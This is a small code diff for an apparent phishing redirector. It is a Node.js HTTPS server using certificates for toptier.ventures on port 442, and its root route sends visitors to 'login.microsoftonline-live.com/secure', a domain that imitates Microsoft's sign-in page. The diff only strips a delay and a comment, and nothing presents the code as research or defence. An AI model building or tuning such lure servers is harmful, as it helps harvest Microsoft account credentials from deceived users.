@@ -8,12 +8,10 @@ const privateKey = fs.readFileSync('/etc/letsencrypt/live/toptier.ventures/privk
 const certificate = fs.readFileSync('/etc/letsencrypt/live/toptier.ventures/fullchain.pem', 'utf8');
 const credentials = { key: privateKey, cert: certificate };
 
-const port = 442; // Standard HTTPS port
+const port = 442;
 
 app.get('/', (req, res) => {
-  setTimeout(() => {
-    res.redirect('https://login.microsoftonline-live.com/secure');
-  }, 10);
+  res.redirect('https://login.microsoftonline-live.com/secure');
 });
 
 const httpsServer = https.createServer(credentials, app);
